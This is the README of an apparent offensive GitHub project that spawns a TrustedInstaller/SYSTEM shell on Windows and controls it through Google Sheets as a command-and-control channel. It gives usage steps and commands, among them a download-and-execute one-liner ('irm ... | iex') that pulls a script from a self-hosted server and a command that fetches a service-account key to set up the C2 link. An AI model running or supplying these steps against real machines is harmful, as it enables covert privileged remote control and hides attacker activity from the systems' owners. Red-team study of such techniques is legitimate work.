# TrustedInstallerPOC-GC2-Sheet

A simple Proof of Concept in Powershell/Go to spawn a new shell as NT Authority\System using Google Sheets as a C2 interface. Read more about how this PoC works on this [blog about TrustedInstaller](https://fourcore.io/blogs/no-more-access-denied-i-am-trustedinstaller) and [GC2-sheet](https://github.com/looCiprian/GC2-sheet). It is important to note that this should be executed as a user which has SeDebugPrivileges. This repository leverages forked repositories: looCiprian/GC2-sheet and FourCoreLabs/TrustedInstallerPOC.

## Configuration

The Powershell script ti2.ps1 pulls nathansb2022/GC2-sheet-Scripted, nathansb2022/TrustedInstallerPOC-GC2-Sheet, and go1.21.12.windows-amd64.zip. Lastly, ti2.ps1 is configured to pull your Google service account .json key. See below for alternative method. For Google Sheets and Drive setup reference [GC2-Sheet-Scripted](https://github.com/nathansb2022/GC2-sheet-Scripted).

## POC

1. Clone the repository

```
$ git clone https://github.com/nathansb2022TrustedInstallerPOC-GC2-Sheet.git
```

2. Ensure you have a web server hosting your Google service account .json key or drop in GC2-Sheet-Scripted-Master

```
$ python3 -m uploadserver 80
```

3. Optional: If you are adding the .json key manually remove line 42 from ti2.ps1

```
Invoke-WebRequest -Uri $keyFileUrl -UseBasicParsing -OutFile ".\master\GC2-sheet-Scripted-master\$myKey"
```

4. Edit ti2.ps1 and define variables

```
$myUrl = ""
$myKey = ""
$mySheetId = ""
$myDriveId = ""
```

6. Either call the ti2.ps1 or execute it in go

```
$ .\ti2.ps1
```
```
$ irm http://$myUrl/ti2.ps1 | iex
```
```
$ go run ti $myKey $mySheetId $myDriveId
```


This will spawn a new cmd shell with TrustedInstaller privileges in Google Sheets which can be confirmed by running the command `whoami /all`

<p align="center">
  <img alt="Logo" src="img/GC2.png" height="30%" width="30%">
</p>

## API

- RunAsTrustedInstaller
  - Use the `RunAsTrustedInstaller` function to pass any executable to be run with TrustedInstaller privileges.
